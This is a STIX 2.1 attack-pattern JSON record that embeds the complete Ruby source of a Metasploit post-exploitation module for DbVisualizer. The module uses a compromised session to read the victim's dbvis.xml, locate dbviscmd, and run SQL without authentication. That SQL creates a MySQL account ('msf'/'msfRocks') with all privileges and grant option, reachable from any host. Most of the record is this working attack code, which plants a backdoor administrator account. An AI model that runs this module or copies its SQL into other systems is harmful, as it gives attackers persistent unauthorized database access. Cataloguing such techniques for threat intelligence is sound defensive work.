{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4dbbf4be-c587-4eac-a360-4d6f580be2db",
    "created": "2024-08-14T16:33:18.006513Z",
    "modified": "2024-08-14T16:33:18.006516Z",
    "name": "Multi Manage DbVisualizer Add Db Admin",
    "description": " Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases (With GUI). The remote database can be accessed from the command line without the need to authenticate, which can be abused to create an administrator in the database with the proper database permissions. Note: This module currently only supports MySQL.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/dbvis_add_db_admin.rb",
            "external_id": "dbvis_add_db_admin.rb"
        },
        {
            "source_name": "reference",
            "url": "http://youtu.be/0LCLRVHX1vA"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage DbVisualizer Add Db Admin',\n        'Description' => %q{\n          Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases\n          (With GUI). The remote database can be accessed from the command line without the need\n          to authenticate, which can be abused to create an administrator in the database with the\n          proper database permissions. Note: This module currently only supports MySQL.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78\n        'References' => [\n          ['URL', 'http://youtu.be/0LCLRVHX1vA']\n        ],\n        'Platform' => %w[linux win],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DBALIAS', [true, 'Use dbvis_enum module to find out databases and aliases', 'localhost']),\n        OptString.new('DBUSERNAME', [true, 'The user you want to add to the remote database', 'msf']),\n        OptString.new('DBPASSWORD', [true, 'User password to set', 'msfRocks'])\n      ]\n    )\n  end\n\n  def run\n    db_type = exist_and_supported\n    unless db_type.blank?\n      dbvis = find_dbviscmd\n      unless dbvis.blank?\n        sql = get_sql(db_type)\n        errors = dbvis_query(dbvis, sql)\n        if errors == true\n          print_error('No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ')\n        else\n          print_good(\"Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}\")\n        end\n      end\n    end\n  end\n\n  # Check if the alias exist and if database is supported by this script\n  def exist_and_supported\n    case session.platform\n    when 'linux'\n      user = session.shell_command('whoami')\n      print_status(\"Current user is #{user}\")\n      if (user =~ /root/)\n        user_base = '/root/'\n      else\n        user_base = \"/home/#{user}/\"\n      end\n      dbvis_file = \"#{user_base}.dbvis/config70/dbvis.xml\"\n    when 'windows'\n      user_profile = session.sys.config.getenv('USERPROFILE')\n      dbvis_file = \"#{user_profile}\\\\.dbvis\\\\config70\\\\dbvis.xml\"\n    end\n\n    unless file?(dbvis_file)\n      # File not found, we next try with the old config path\n      print_status(\"File not found: #{dbvis_file}\")\n      print_status('This could be an older version of dbvis, trying old path')\n\n      case session.platform\n      when 'linux'\n        dbvis_file = \"#{user_base}.dbvis/config/dbvis.xml\"\n      when 'windows'\n        dbvis_file = \"#{user_profile}\\\\.dbvis\\\\config\\\\dbvis.xml\"\n      end\n      unless file?(dbvis_file)\n        print_error(\"File not found: #{dbvis_file}\")\n        return\n      end\n\n      old_version = true\n    end\n\n    print_status(\"Reading : #{dbvis_file}\")\n    raw_xml = ''\n    begin\n      raw_xml = read_file(dbvis_file)\n    rescue EOFError\n      # If there's nothing in the file, we hit EOFError\n      print_error(\"Nothing read from file: #{dbvis_file}, file may be empty\")\n      return\n    end\n\n    db_found = false\n    alias_found = false\n    db_type = nil\n    db_type_ok = false\n\n    # fetch config file\n    raw_xml.each_line do |line|\n      if line =~ /<Database id=/\n        db_found = true\n      elsif line =~ %r{</Database>}\n        db_found = false\n      end\n\n      next unless db_found == true\n\n      # checkthe alias\n      if (line =~ %r{<Alias>([\\S+\\s+]+)</Alias>}i) && (datastore['DBALIAS'] == ::Regexp.last_match(1))\n        alias_found = true\n        print_good(\"Alias #{datastore['DBALIAS']} found in dbvis.xml\")\n      end\n\n      if (line =~ %r{<Userid>([\\S+\\s+]+)</Userid>}i) && alias_found\n        print_good(\"Username for this connection : #{::Regexp.last_match(1)}\")\n      end\n\n      # check the type\n      next unless (line =~ %r{<Type>([\\S+\\s+]+)</Type>}i) && alias_found\n\n      db_type = ::Regexp.last_match(1)\n      db_type_ok = check_db_type(db_type)\n      if db_type_ok\n        print_good(\"Database #{db_type} is supported \")\n      else\n        print_error(\"Database #{db_type} is not supported (yet)\")\n        db_type = nil\n      end\n      alias_found = false\n    end\n    if db_type.blank?\n      print_error('Database alias not found in dbvis.xml')\n    end\n    return db_type # That is empty if DB is not supported\n  end\n\n  # Find path to dbviscmd.sh|bat\n  def find_dbviscmd\n    case session.platform\n    when 'linux'\n      dbvis = session.shell_command('locate dbviscmd.sh').chomp\n      if dbvis.chomp == ''\n        print_error('dbviscmd.sh not found')\n        return nil\n      else\n        print_good(\"Dbviscmd found : #{dbvis}\")\n      end\n    when 'windows'\n      # Find program files\n      progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')\n      progfiles_x86 = progfiles_env['ProgramFiles(X86)']\n      if !progfiles_x86.blank? && progfiles_x86 !~ (/%ProgramFiles\\(X86\\)%/)\n        program_files = progfiles_x86 # x64\n      else\n        program_files = progfiles_env['ProgramFiles'] # x86\n      end\n      dirs = []\n      session.fs.dir.foreach(program_files) do |d|\n        dirs << d\n      end\n      dbvis_home_dir = nil\n      # Browse program content to find a possible dbvis home\n      dirs.each do |d|\n        if (d =~ /DbVisualizer[\\S+\\s+]+/i)\n          dbvis_home_dir = d\n        end\n      end\n      if dbvis_home_dir.blank?\n        print_error('Dbvis home not found, maybe uninstalled ?')\n        return nil\n      end\n      dbvis = \"#{program_files}\\\\#{dbvis_home_dir}\\\\dbviscmd.bat\"\n      unless file?(dbvis)\n        print_error('dbviscmd.bat not found')\n        return nil\n      end\n      print_good(\"Dbviscmd found : #{dbvis}\")\n    end\n    return dbvis\n  end\n\n  # Query execution method\n  def dbvis_query(dbvis, sql)\n    error = false\n    resp = ''\n    if file?(dbvis) == true\n      f = session.fs.file.stat(dbvis)\n      if (f.uid == Process.euid) || Process.groups.include?(f.gid)\n        print_status('Trying to execute evil sql, it can take time ...')\n        args = \"-connection #{datastore['DBALIAS']} -sql \\\"#{sql}\\\"\"\n        dbvis = \"\\\"#{dbvis}\\\"\"\n        cmd = \"#{dbvis} #{args}\"\n        resp = cmd_exec(cmd)\n        vprint_line\n        vprint_status(resp.to_s)\n        if resp =~ /denied|failed/i\n          error = true\n        end\n      else\n        print_error(\"User doesn't have enough rights to execute dbviscmd, aborting\")\n      end\n    else\n      print_error(\"#{dbvis} is not a file\")\n    end\n    return error\n  end\n\n  # Database dependent part\n\n  # Check if db type is supported by this script\n  def check_db_type(type)\n    return type.to_s =~ /mysql/i\n  end\n\n  # Build proper sql\n  def get_sql(db_type)\n    if db_type =~ /mysql/i\n      sql = \"CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';\"\n      sql << \"GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;\"\n\n      sql << \"CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';\"\n      sql << \"GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;\"\n      return sql\n    end\n    return nil\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux win]"
    ]
}